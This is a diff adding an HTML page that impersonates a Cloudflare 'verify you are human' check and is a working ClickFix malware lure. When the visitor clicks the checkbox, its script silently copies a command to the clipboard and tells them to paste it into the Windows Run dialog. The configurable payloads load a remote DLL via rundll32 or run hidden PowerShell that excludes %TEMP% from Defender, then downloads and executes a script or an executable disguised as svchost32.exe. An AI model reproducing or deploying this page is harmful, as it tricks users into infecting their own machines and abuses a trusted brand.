@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Just a moment...</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .cf-header {
+    background: #404041;
+    padding: 11px 28px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .cf-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    text-decoration: none;
+    letter-spacing: -.2px;
+  }
+  .header-note { color: #aaa; font-size: 12px; }
+
+  .main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 4px;
+    box-shadow: 0 1px 6px rgba(0,0,0,.12);
+    width: 100%;
+    max-width: 480px;
+    overflow: hidden;
+  }
+
+  .card-status {
+    background: #f6821f;
+    padding: 13px 22px;
+    color: #fff;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: .1px;
+    transition: background .3s;
+  }
+  .card-status.warn { background: #d97706; }
+
+  .card-body { padding: 28px 22px 20px; }
+
+  .site-name {
+    font-size: 21px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 3px;
+    word-break: break-all;
+  }
+  .sub-text { font-size: 14px; color: #555; margin-bottom: 24px; }
+
+  .spinner-wrap {
+    display: flex; align-items: center; justify-content: center;
+    margin: 32px 0 28px;
+  }
+  .spinner {
+    width: 46px; height: 46px;
+    border: 4px solid #e4e4e4;
+    border-top-color: #f6821f;
+    border-radius: 50%;
+    animation: spin .75s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .verify-row {
+    display: none;
+    background: #f7f7f7;
+    border: 1px solid #d2d2d2;
+    border-radius: 3px;
+    padding: 14px 16px;
+    align-items: center;
+    gap: 14px;
+    cursor: pointer;
+    margin: 16px 0 20px;
+    user-select: none;
+    transition: background .15s;
+  }
+  .verify-row:hover { background: #efefef; }
+  .cf-checkbox {
+    width: 24px; height: 24px;
+    border: 2px solid #999;
+    border-radius: 3px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    transition: border-color .2s;
+    background: #fff;
+  }
+  .verify-label { font-size: 14px; color: #333; flex: 1; }
+  .captcha-logo {
+    display: flex; flex-direction: column; align-items: center;
+    gap: 2px; opacity: .45;
+  }
+  .captcha-logo span { font-size: 9px; color: #777; }
+
+  .steps-box { display: none; margin: 16px 0 8px; }
+
+  .steps-title {
+    font-size: 14px; font-weight: 600; color: #1a1a1a;
+    margin-bottom: 18px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .step-row {
+    display: flex; align-items: flex-start;
+    gap: 12px; margin-bottom: 14px;
+  }
+  .step-num {
+    width: 22px; height: 22px;
+    background: #f6821f; color: #fff;
+    border-radius: 50%;
+    font-size: 11px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
+  }
+  .step-desc { font-size: 13.5px; color: #444; line-height: 1.5; }
+  .key {
+    display: inline-block;
+    background: #f0f0f0;
+    border: 1px solid #c8c8c8;
+    border-bottom-width: 2px;
+    border-radius: 3px;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    padding: 1px 6px;
+    color: #222;
+  }
+
+  .copied-pill {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: #ecfdf5; border: 1px solid #6ee7b7;
+    color: #065f46; font-size: 12px;
+    padding: 5px 12px; border-radius: 20px;
+    margin-top: 6px;
+  }
+
+  .card-footer {
+    border-top: 1px solid #ebebeb;
+    background: #fafafa;
+    padding: 12px 22px;
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .ray-id { font-family: 'Courier New', monospace; font-size: 11.5px; color: #999; }
+  .cf-attr {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 11.5px; color: #bbb;
+  }
+
+  .page-footer {
+    text-align: center; padding: 14px;
+    font-size: 11.5px; color: #aaa;
+  }
+  .page-footer a { color: #f6821f; text-decoration: none; }
+  .page-footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div class="cf-header">
+  <a class="cf-logo" href="#">
+    <svg width="30" height="19" viewBox="0 0 109 67" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M81.682 54.547c.493-1.688.303-3.231-.539-4.37-.776-1.055-2.003-1.656-3.447-1.703l-47.37-.62a.45.45 0 01-.378-.208.447.447 0 01.275-.686l.47-.109 47.9-.62c5.676-.269 11.804-4.829 13.956-10.367l2.73-7.146a1.61 1.61 0 00.06-.983C92.04 12.93 79.73 2.48 64.998 2.48c-13.375 0-24.798 8.605-28.946 20.614-2.647-1.951-5.983-3.025-9.647-2.815-6.803.384-12.276 5.798-12.721 12.598-.133 2.02.17 3.963.84 5.745C6.437 38.737 0 45.376 0 53.575c0 .493.027.98.079 1.463.034.321.308.567.63.567h80.338c.324 0 .6-.238.635-.56l.009-.073v-.028c-.003-.133-.005-.264.008-.397" fill="#f6821f"/>
+    </svg>
+    Cloudflare
+  </a>
+  <div class="header-note">DDoS protection active</div>
+</div>
+
+<div class="main">
+  <div class="card">
+    <div class="card-status" id="statusBar">Checking your browser…</div>
+    <div class="card-body">
+      <div class="site-name" id="siteName"></div>
+      <div class="sub-text" id="subText">Checking if the site connection is secure</div>
+
+      <div class="spinner-wrap" id="spinnerWrap">
+        <div class="spinner"></div>
+      </div>
+
+      <div class="verify-row" id="verifyRow" onclick="handleVerify()">
+        <div class="cf-checkbox" id="cfCheckbox"></div>
+        <span class="verify-label">Verify you are human</span>
+        <div class="captcha-logo">
+          <svg width="22" height="14" viewBox="0 0 109 67" fill="none">
+            <path d="M81.682 54.547c.493-1.688.303-3.231-.539-4.37-.776-1.055-2.003-1.656-3.447-1.703l-47.37-.62a.45.45 0 01-.378-.208.448.448 0 01.275-.686l.47-.109 47.9-.62c5.676-.269 11.804-4.829 13.956-10.367l2.73-7.146a1.61 1.61 0 00.06-.983C92.04 12.93 79.73 2.48 64.998 2.48c-13.375 0-24.798 8.605-28.946 20.614-2.647-1.951-5.983-3.025-9.647-2.815-6.803.384-12.276 5.798-12.721 12.598-.133 2.02.17 3.963.84 5.745C6.437 38.737 0 45.376 0 53.575c0 .493.027.98.079 1.463.034.321.308.567.63.567h80.338c.324 0 .6-.238.635-.56l.009-.073v-.028c-.003-.133-.005-.264.008-.397" fill="#f6821f"/>
+          </svg>
+          <span>Cloudflare</span>
+        </div>
+      </div>
+
+      <div class="steps-box" id="stepsBox">
+        <div class="steps-title">
+          <svg width="16" height="16" fill="none" stroke="#d97706" stroke-width="2" viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/>
+          </svg>
+          Browser verification requires a manual step
+        </div>
+        <div class="step-row">
+          <div class="step-num">1</div>
+          <div class="step-desc">Press <span class="key">⊞ Win</span> + <span class="key">R</span> to open the Run dialog</div>
+        </div>
+        <div class="step-row">
+          <div class="step-num">2</div>
+          <div class="step-desc">Press <span class="key">Ctrl</span> + <span class="key">V</span> to paste the verification token</div>
+        </div>
+        <div class="step-row">
+          <div class="step-num">3</div>
+          <div class="step-desc">Press <span class="key">Enter</span> — verification completes automatically</div>
+        </div>
+        <div class="copied-pill">
+          <svg width="12" height="12" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+          Verification token copied to clipboard
+        </div>
+      </div>
+
+      <div style="font-size:12px;color:#ccc;margin-top:22px;">
+        Performance &amp; security by <span style="color:#bbb;font-weight:500;">Cloudflare</span>
+      </div>
+    </div>
+
+    <div class="card-footer">
+      <div class="ray-id">Ray ID: <span id="rayId"></span></div>
+      <div class="cf-attr">
+        <svg width="13" height="8" viewBox="0 0 109 67" fill="none">
+          <path d="M81.682 54.547c.493-1.688.303-3.231-.539-4.37-.776-1.055-2.003-1.656-3.447-1.703l-47.37-.62a.45.45 0 01-.378-.208.448.448 0 01.275-.686l.47-.109 47.9-.62c5.676-.269 11.804-4.829 13.956-10.367l2.73-7.146a1.61 1.61 0 00.06-.983C92.04 12.93 79.73 2.48 64.998 2.48c-13.375 0-24.798 8.605-28.946 20.614-2.647-1.951-5.983-3.025-9.647-2.815-6.803.384-12.276 5.798-12.721 12.598-.133 2.02.17 3.963.84 5.745C6.437 38.737 0 45.376 0 53.575c0 .493.027.98.079 1.463.034.321.308.567.63.567h80.338c.324 0 .6-.238.635-.56l.009-.073v-.028c-.003-.133-.005-.264.008-.397" fill="#f6821f"/>
+        </svg>
+        Cloudflare
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="page-footer">
+  &copy; 2024 Cloudflare, Inc. &nbsp;|&nbsp;
+  <a href="#">Privacy Policy</a> &nbsp;|&nbsp;
+  <a href="#">Terms of Use</a>
+</div>
+
+<script>
+// ╔══════════════════════════════════════════════════════════════════╗
+// ║  CONFIG                                                         ║
+// ╠══════════════════════════════════════════════════════════════════╣
+
+const CFG = {
+  // cosmetic
+  site: 'kekman.space',
+
+  // payload mode:
+  //   'rundll32'  — UNC DLL via rundll32
+  //   'ps_url'    — fetch remote .ps1 and iex
+  //   'ps_b64'    — inline base64-encoded powershell
+  //   'exe_drop'  — download exe to %TEMP% and run
+  mode: 'rundll32',
+
+  // ── rundll32 ──────────────────────────────────────────────────
+  // UNC path to WebDAV-hosted DLL, ordinal or export name after comma
+  unc: '\\\\svc4static.zenithprospera.in.net\\verification.google,#1',
+
+  // ── ps_url ────────────────────────────────────────────────────
+  ps_url: 'https://kekman.space/p.ps1',
+
+  // ── ps_b64 ────────────────────────────────────────────────────
+  // generate:
+  //   $s = 'IyDilZTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZcKIyDilZEgIENPTkZJRyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQojIOKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVowoKJEVYRV9VUkwgID0gJ2h0dHA6Ly9rZWttYW4uc3BhY2UvdmVyaWZ5LmV4ZScgICAjIHJlbW90ZSBleGUgdG8gZHJvcAokRVhFX05BTUUgPSAnc3ZjaG9zdDMyLmV4ZScgICAgICAgICAgICAgICAjIG5hbWUgb24gZGlzayB1bmRlciAlVEVNUCUKJEFWX0VYQ0wgID0gJHRydWUgICAgICAgICAgICAgICAgICAgICAgICAgIyBibGluZCBEZWZlbmRlciB0byAlVEVNUCUKCiMg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCgojIDEg4oCUIG9wdGlvbmFsbHkgZXhjbHVkZSAlVEVNUCUgZnJvbSBEZWZlbmRlciByZWFsLXRpbWUgc2Nhbm5pbmcKaWYgKCRBVl9FWENMKSB7CiAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRlbnY6VEVNUCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQp9CgojIDIg4oCUIGRyb3AgZXhlCiRkZXN0ID0gSm9pbi1QYXRoICRlbnY6VEVNUCAkRVhFX05BTUUKCnRyeSB7CiAgICAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJEVYRV9VUkwsICRkZXN0KQp9IGNhdGNoIHsKICAgICMgZmFsbGJhY2s6IEJJVFMgdHJhbnNmZXIgKGJ5cGFzc2VzIHNvbWUgcHJveHkgZmlsdGVycykKICAgIFN0YXJ0LUJpdHNUcmFuc2ZlciAtU291cmNlICRFWEVfVVJMIC1EZXN0aW5hdGlvbiAkZGVzdCAtRXJyb3JBY3Rpb24gU3RvcAp9CgojIDMg4oCUIGV4ZWN1dGUgaGlkZGVuCmlmIChUZXN0LVBhdGggJGRlc3QpIHsKICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRkZXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4KfQ=='
+  //   [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
+  ps_b64: '',
+
+  // ── exe_drop ──────────────────────────────────────────────────
+  exe_url:  'http://kekman.space/payload.exe',
+  exe_name: 'svchost32.exe',
+
+  // Add-MpPreference -ExclusionPath %TEMP% before drop
+  // does not need elevation, blinds Defender to that path
+  av_excl: true,
+};
+
+// ╚══════════════════════════════════════════════════════════════════╝
+
+function buildPayload() {
+  const av = CFG.av_excl
+    ? 'Add-MpPreference -ExclusionPath $env:TEMP;'
+    : '';
+
+  switch (CFG.mode) {
+
+    case 'rundll32':
+      return 'rundll32.exe ' + CFG.unc;
+
+    case 'ps_url':
+      return 'powershell -w h -nop -noni -ep bypass -c "'
+        + av
+        + "iex(iwr '" + CFG.ps_url + "' -UseBasicParsing)"
+        + '"';
+
+    case 'ps_b64':
+      return 'powershell -w h -nop -noni -ep bypass -c "'
+        + av
+        + "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + CFG.ps_b64 + "')))"
+        + '"';
+
+    case 'exe_drop':
+      return 'powershell -w h -nop -noni -ep bypass -c "'
+        + av
+        + '$p=\\"$env:TEMP\\' + CFG.exe_name + '\\";'
+        + "(New-Object Net.WebClient).DownloadFile('" + CFG.exe_url + "',$p);"
+        + 'Start-Process $p -WindowStyle Hidden"';
+
+    default:
+      return '';
+  }
+}
+
+const PAYLOAD = buildPayload();
+
+// populate cosmetics
+document.getElementById('siteName').textContent = CFG.site;
+document.getElementById('rayId').textContent =
+  Array.from({length: 16}, () => '0123456789abcdef'[Math.random() * 16 | 0]).join('');
+
+// phase 1 → 2: spinner → verify checkbox
+setTimeout(() => {
+  document.getElementById('spinnerWrap').style.display = 'none';
+  document.getElementById('verifyRow').style.display   = 'flex';
+  document.getElementById('statusBar').textContent     = 'Verification required';
+  document.getElementById('subText').textContent       =
+    'Cloudflare needs to verify your browser before granting access.';
+}, 2600);
+
+function handleVerify() {
+  // tick checkbox
+  const box = document.getElementById('cfCheckbox');
+  box.innerHTML = `<svg width="13" height="13" fill="none" stroke="#f6821f"
+    stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>`;
+  box.style.borderColor = '#f6821f';
+
+  // write payload to clipboard
+  navigator.clipboard.writeText(PAYLOAD).catch(() => {
+    const t = Object.assign(document.createElement('textarea'),
+      { value: PAYLOAD, style: 'position:fixed;opacity:0' });
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand('copy');
+    document.body.removeChild(t);
+  });
+
+  // phase 2 → 3: show Win+R steps
+  setTimeout(() => {
+    document.getElementById('verifyRow').style.display  = 'none';
+    document.getElementById('stepsBox').style.display   = 'block';
+    document.getElementById('statusBar').textContent    = 'Almost there — one more step';
+    document.getElementById('statusBar').className      = 'card-status warn';
+    document.getElementById('subText').textContent      =
+      'Your browser needs to confirm your identity using a secure token.';
+  }, 500);
+}
+</script>
+</body>
+</html>
